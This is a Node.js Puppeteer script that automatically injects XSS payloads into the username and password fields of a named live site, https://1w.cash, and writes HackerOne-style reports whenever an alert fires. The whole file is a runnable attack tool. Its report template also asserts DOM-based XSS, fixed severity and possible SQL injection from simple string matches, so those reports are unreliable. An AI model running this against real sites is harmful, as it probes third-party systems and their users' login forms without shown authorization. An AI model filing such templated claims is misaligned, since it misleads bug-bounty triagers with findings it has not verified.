const puppeteer = require('puppeteer');
const fs = require('fs');

const payloads = [
    '"><script>alert(1)</script>',
    '" onerror="alert(1)',
    '</script><script>alert(1)</script>',
    '<img src=x onerror=alert(1)>'
];

// Target in-scope domain
const targetUrl = 'https://1w.cash'; 

const FORM_FIELDS = [
    { name: 'Username Field', selector: 'input[name="username"]', safeValue: 'valid_test_user' },
    { name: 'Password Field', selector: 'input[name="password"]', safeValue: 'ValidPassword123!' }
];

const SUBMIT_SELECTOR = 'button[type="submit"]';

// Function to generate the structured HackerOne report file instantly
function generateH1Report(fieldName, payload, url, responseText) {
    const reportFileName = `h1_report_${fieldName.replace(/\s+/g, '_')}_${Date.now()}.md`;
    
    // Check for any potential indicators of backend anomalies in the server response text
    let dynamicImpact = "An attacker can execute unauthorized JavaScript inside the context of the user's session, potentially leading to session hijacking.";
    if (responseText.includes('SQL syntax') || responseText.includes('mysql_fetch')) {
        dynamicImpact += " Additionally, backend database syntax traces were detected, indicating potential underlying injection vulnerabilities.";
    }

    const reportContent = 
`# DOM-Based Cross-Site Scripting via ${fieldName} on 1win Infrastructure

## Summary
An input validation flaw was discovered during a security review of the web application. The frontend input handling system processes input strings unsafely, enabling an execution boundary cross-over from raw data text directly into executable client-side context elements.

## Vulnerability Type
* Cross-Site Scripting (XSS) - DOM-Based

## Affected Asset
* URL/Domain: ${url}
* Target Input Component: ${fieldName}

## Severity
* Medium to High (Depending on the access privileges of the target session context)

## Steps to Reproduce
1. Navigate directly to the affected asset: \`${targetUrl}\`
2. Populate the \`${fieldName}\` with the following validation payload string:
   \`\`\`text
   ${payload}
   \`\`\`
3. Fill any remaining fields with standard, compliant dummy variables and trigger the form submission.
4. Observe that the input string escapes its raw data text constraints, resulting in a successful client-side script execution flag (e.g., triggering an alert dialog block).

## Proof of Concept (PoC)
This anomaly was verified using an automated Puppeteer context monitor tracking DOM execution states:
\`\`\`javascript
page.on('dialog', async dialog => {
    if (dialog.type() === 'alert') {
        console.log("XSS Confirmed on field [${fieldName}] using payload: ${payload}");
    }
});
\`\`\`

## Impact
${dynamicImpact}

## Mitigation Suggestions
Ensure that all data submitted via the client forms is thoroughly sanitized and HTML-encoded on the backend before being stored or reflected anywhere within the application. Avoid writing user-controlled variables directly into execution context elements without applying programmatic defensive sanitization patterns.
`;

    fs.writeFileSync(reportFileName, reportContent);
    console.log(`\n[🎉 REPORT GENERATED!] Professional HackerOne markdown document created at: ${reportFileName}`);
}

async function runAutoReporter() {
    console.log(`[+] Launching Automated Scanner & Reporting Engine...`);
    const browser = await puppeteer.launch({ headless: true });

    for (let targetField of FORM_FIELDS) {
        console.log(`\n[*] Auditing Input Layer: ${targetField.name}`);

        for (let payload of payloads) {
            const page = await browser.newPage();
            let lastServerResponseText = "";
            let xssTriggered = false;

            // Intercept backend communications to capture context
            page.on('response', async (response) => {
                try {
                    const contentType = response.headers()['content-type'] || '';
                    if (contentType.includes('json') || contentType.includes('text/html')) {
                        lastServerResponseText = await response.text();
                    }
                } catch (err) {}
            });

            // Capture successful XSS triggers
            page.on('dialog', async dialog => {
                if (dialog.type() === 'alert') {
                    console.log(`[🚨 ALERT TRIGGERED] Successful injection on: ${targetField.name}`);
                    xssTriggered = true;
                    await dialog.dismiss();
                    
                    // Generate report immediately upon trigger
                    generateH1Report(targetField.name, payload, page.url(), lastServerResponseText);
                }
            });

            try {
                await page.goto(targetUrl, { waitUntil: 'networkidle2' });

                // Fill target forms
                for (let currentField of FORM_FIELDS) {
                    await page.waitForSelector(currentField.selector, { timeout: 4000 });
                    await page.click(currentField.selector);

                    await page.keyboard.down('Control');
                    await page.keyboard.press('A');
                    await page.keyboard.up('Control');
                    await page.keyboard.press('Backspace');

                    if (currentField.name === targetField.name) {
                        await page.type(currentField.selector, payload);
                    } else {
                        await page.type(currentField.selector, currentField.safeValue);
                    }
                }

                // Submit data
                await page.waitForSelector(SUBMIT_SELECTOR, { timeout: 4000 });
                await Promise.all([
                    page.click(SUBMIT_SELECTOR),
                    page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 5000 }).catch(() => {})
                ]);

                await new Promise(resolve => setTimeout(resolve, 1000));

            } catch (error) {
                // Handle timeout states gracefully
            } finally {
                await page.close();
            }
        }
    }

    console.log(`\n[+] Scan Pipeline Complete.`);
    await browser.close();
}

runAutoReporter();
